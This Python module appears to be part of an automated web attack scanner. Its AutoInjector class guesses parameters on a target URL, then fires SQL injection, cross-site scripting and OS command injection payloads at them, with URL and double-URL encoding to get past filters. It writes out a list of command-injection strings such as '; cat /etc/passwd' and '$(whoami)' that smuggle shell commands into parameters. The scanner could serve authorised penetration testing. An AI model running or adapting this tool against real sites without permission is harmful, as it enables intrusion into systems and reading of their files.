#!/usr/bin/env python3
"""
Advanced Auto Payload Injector
Automatically injects payloads with various encoding and bypass techniques
"""

import requests
import time
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode, quote
from payloads import Payloads
from ui import StatusDisplay, Animations
from notifier import VulnerabilityNotifier

class AutoInjector:
    """Automatic payload injection with bypass techniques"""
    
    def __init__(self, notifier: VulnerabilityNotifier) -> None:
        self.notifier = notifier
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def discover_parameters(self, url: str) -> List[str]:
        """Auto-discover parameters from URL"""
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())
        
        # Common parameter names to try
        common_params = ['id', 'page', 'query', 'search', 'q', 'user', 'username', 
                        'item', 'cat', 'category', 'name', 'data', 'file']
        
        # Combine discovered and common
        all_params = list(set(params + common_params))
        
        StatusDisplay.info(f"Discovered {len(all_params)} potential parameters: {', '.join(all_params[:5])}...")
        return all_params
    
    def encode_payload(self, payload: str, encoding_type: str) -> str:
        """Encode payload with various techniques"""
        if encoding_type == 'url':
            return quote(payload)
        elif encoding_type == 'double_url':
            return quote(quote(payload))
        elif encoding_type == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding_type == 'hex':
            return '0x' + ''.join(f'{ord(c):02x}' for c in payload)
        elif encoding_type == 'base64':
            import base64
            return base64.b64encode(payload.encode()).decode()
        else:
            return payload
    
    def inject_sql_auto(self, url: str, method: str = 'GET') -> Dict[str, Any]:
        """Automatically inject SQL payloads with various techniques"""
        StatusDisplay.info("Starting automatic SQL injection...")
        
        results: Dict[str, Any] = {
            'vulnerable_params': [],
            'successful_payloads': [],
            'total_attempts': 0,
            'found_vulnerabilities': 0
        }
        
        # Discover parameters
        params_to_test = self.discover_parameters(url)
        
        # Get SQL payloads
        sql_payloads = Payloads.get_sql_injection_payloads()
        
        # Encoding techniques to try
        encodings = ['none', 'url', 'double_url']
        
        total_tests = len(params_to_test) * len(sql_payloads) * len(encodings)
        current_test = 0
        
        print()
        for param in params_to_test:
            for payload in sql_payloads:
                for encoding in encodings:
                    current_test += 1
                    Animations.progress_bar(
                        current_test, 
                        total_tests, 
                        f"Testing {param} with {encoding} encoding"
                    )
                    
                    # Encode payload
                    encoded_payload = self.encode_payload(payload, encoding) if encoding != 'none' else payload
                    
                    # Inject payload
                    try:
                        if method.upper() == 'GET':
                            test_url = self._build_test_url(url, param, encoded_payload)
                            response = self.session.get(test_url, timeout=5)
                        else:
                            data = {param: encoded_payload}
                            response = self.session.post(url, data=data, timeout=5)
                        
                        results['total_attempts'] += 1
                        
                        # Analyze response
                        if self._detect_sql_vulnerability(response.text):
                            results['found_vulnerabilities'] = int(results['found_vulnerabilities']) + 1
                            
                            vuln_info: Dict[str, Any] = {
                                'param': param,
                                'payload': payload,
                                'encoding': encoding,
                                'method': method
                            }
                            vuln_params: List[Any] = results['vulnerable_params']
                            vuln_params.append(param)
                            results['vulnerable_params'] = vuln_params
                            
                            payloads_list: List[Any] = results['successful_payloads']
                            payloads_list.append(vuln_info)
                            results['successful_payloads'] = payloads_list
                            
                            # Notify
                            self.notifier.add_finding(
                                vuln_type='SQL Injection (Auto-Detected)',
                                severity='CRITICAL',
                                url=url,
                                payload=f"{param}={encoded_payload}",
                                description=f'Vulnerable parameter: {param}, Encoding: {encoding}',
                                evidence=response.text[:500]
                            )
                            
                            print()
                            StatusDisplay.vulnerability_found(
                                'SQL Injection',
                                'CRITICAL',
                                f'Parameter: {param} | Payload: {payload[:30]}... | Encoding: {encoding}'
                            )
                        
                        time.sleep(0.1)  # Rate limiting
                        
                    except requests.exceptions.Timeout:
                        # Timeout might indicate successful injection (SLEEP)
                        if 'SLEEP' in payload.upper() or 'BENCHMARK' in payload.upper():
                            results['found_vulnerabilities'] = int(results['found_vulnerabilities']) + 1
                            print()
                            StatusDisplay.vulnerability_found(
                                'SQL Injection (Time-based)',
                                'CRITICAL',
                                f'Parameter: {param} | Timeout detected'
                            )
                    except Exception:
                        pass
        
        print()
        return results
    
    def inject_xss_auto(self, url: str, method: str = 'GET') -> Dict[str, Any]:
        """Automatically inject XSS payloads with various techniques"""
        StatusDisplay.info("Starting automatic XSS injection...")
        
        results: Dict[str, Any] = {
            'vulnerable_params': [],
            'successful_payloads': [],
            'total_attempts': 0,
            'found_vulnerabilities': 0
        }
        
        # Discover parameters
        params_to_test = self.discover_parameters(url)
        
        # Get XSS payloads
        xss_payloads = Payloads.get_xss_payloads()
        
        # Encoding techniques
        encodings = ['none', 'url', 'html_entities']
        
        total_tests = len(params_to_test) * len(xss_payloads) * len(encodings)
        current_test = 0
        
        print()
        for param in params_to_test:
            for payload in xss_payloads:
                for encoding in encodings:
                    current_test += 1
                    Animations.progress_bar(
                        current_test,
                        total_tests,
                        f"Testing {param} with {encoding} encoding"
                    )
                    
                    # Encode payload
                    encoded_payload = self._encode_xss(payload, encoding)
                    
                    # Inject payload
                    try:
                        if method.upper() == 'GET':
                            test_url = self._build_test_url(url, param, encoded_payload)
                            response = self.session.get(test_url, timeout=5)
                        else:
                            data = {param: encoded_payload}
                            response = self.session.post(url, data=data, timeout=5)
                        
                        results['total_attempts'] += 1
                        
                        # Analyze response
                        if self._detect_xss_vulnerability(response.text, payload):
                            results['found_vulnerabilities'] = int(results['found_vulnerabilities']) + 1
                            
                            vuln_info: Dict[str, Any] = {
                                'param': param,
                                'payload': payload,
                                'encoding': encoding,
                                'method': method
                            }
                            vuln_params: List[Any] = results['vulnerable_params']
                            vuln_params.append(param)
                            results['vulnerable_params'] = vuln_params
                            
                            payloads_list: List[Any] = results['successful_payloads']
                            payloads_list.append(vuln_info)
                            results['successful_payloads'] = payloads_list
                            
                            # Notify
                            self.notifier.add_finding(
                                vuln_type='Cross-Site Scripting (XSS)',
                                severity='HIGH',
                                url=url,
                                payload=f"{param}={encoded_payload}",
                                description=f'Reflected XSS in parameter: {param}',
                                evidence=response.text[:500]
                            )
                            
                            print()
                            StatusDisplay.vulnerability_found(
                                'XSS',
                                'HIGH',
                                f'Parameter: {param} | Payload: {payload[:30]}...'
                            )
                        
                        time.sleep(0.1)
                        
                    except Exception:
                        pass
        
        print()
        return results
    
    def inject_command_auto(self, url: str, method: str = 'GET') -> Dict[str, Any]:
        """Automatically inject OS command payloads"""
        StatusDisplay.info("Starting automatic OS command injection...")
        
        results: Dict[str, Any] = {
            'vulnerable_params': [],
            'successful_payloads': [],
            'total_attempts': 0,
            'found_vulnerabilities': 0
        }
        
        # Discover parameters
        params_to_test = self.discover_parameters(url)
        
        # Command injection payloads
        cmd_payloads = [
            '; ls -la',
            '| whoami',
            '& dir',
            '`id`',
            '$(whoami)',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; ping -c 4 127.0.0.1',
            '& ping -n 4 127.0.0.1'
        ]
        
        total_tests = len(params_to_test) * len(cmd_payloads)
        current_test = 0
        
        print()
        for param in params_to_test:
            for payload in cmd_payloads:
                current_test += 1
                Animations.progress_bar(current_test, total_tests, f"Testing {param}")
                
                try:
                    if method.upper() == 'GET':
                        test_url = self._build_test_url(url, param, payload)
                        response = self.session.get(test_url, timeout=5)
                    else:
                        data = {param: payload}
                        response = self.session.post(url, data=data, timeout=5)
                    
                    results['total_attempts'] += 1
                    
                    # Detect command injection
                    if self._detect_command_injection(response.text):
                        results['found_vulnerabilities'] = int(results['found_vulnerabilities']) + 1
                        
                        vuln_params: List[Any] = results['vulnerable_params']
                        vuln_params.append(param)
                        results['vulnerable_params'] = vuln_params
                        
                        self.notifier.add_finding(
                            vuln_type='OS Command Injection',
                            severity='CRITICAL',
                            url=url,
                            payload=f"{param}={payload}",
                            description=f'Command injection in parameter: {param}',
                            evidence=response.text[:500]
                        )
                        
                        print()
                        StatusDisplay.vulnerability_found(
                            'Command Injection',
                            'CRITICAL',
                            f'Parameter: {param} | Payload: {payload}'
                        )
                    
                    time.sleep(0.1)
                    
                except Exception:
                    pass
        
        print()
        return results
    
    def _build_test_url(self, base_url: str, param: str, value: str) -> str:
        """Build test URL with parameter"""
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)
        params[param] = [value]
        
        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _encode_xss(self, payload: str, encoding: str) -> str:
        """Encode XSS payload"""
        if encoding == 'url':
            return quote(payload)
        elif encoding == 'html_entities':
            return payload.replace('<', '&lt;').replace('>', '&gt;')
        return payload
    
    def _detect_sql_vulnerability(self, response_text: str) -> bool:
        """Detect SQL vulnerability in response"""
        sql_errors = [
            'sql syntax', 'mysql', 'sqlite', 'postgresql', 'oracle',
            'syntax error', 'database error', 'warning: mysql',
            'unclosed quotation', 'quoted string not properly terminated',
            'mssql', 'odbc', 'jdbc', 'ora-', 'pg_query', 'sqlite3',
            'db2', 'sybase', 'unexpected end of SQL command'
        ]
        
        response_lower = response_text.lower()
        return any(error in response_lower for error in sql_errors)
    
    def _detect_xss_vulnerability(self, response_text: str, payload: str) -> bool:
        """Detect XSS vulnerability in response"""
        # Check if payload is reflected without proper encoding
        if payload in response_text:
            # Check if it's in a dangerous context
            if any(tag in response_text for tag in ['<script', '<img', '<svg', '<body', '<iframe']):
                return True
        return False
    
    def _detect_command_injection(self, response_text: str) -> bool:
        """Detect command injection in response"""
        indicators = [
            'root:', 'bin/bash', 'uid=', 'gid=', 'groups=',
            'c:\\windows', 'c:\\users', 'volume serial number',
            'directory of', 'total', 'drwx', '-rw-'
        ]
        
        response_lower = response_text.lower()
        return any(indicator in response_lower for indicator in indicators)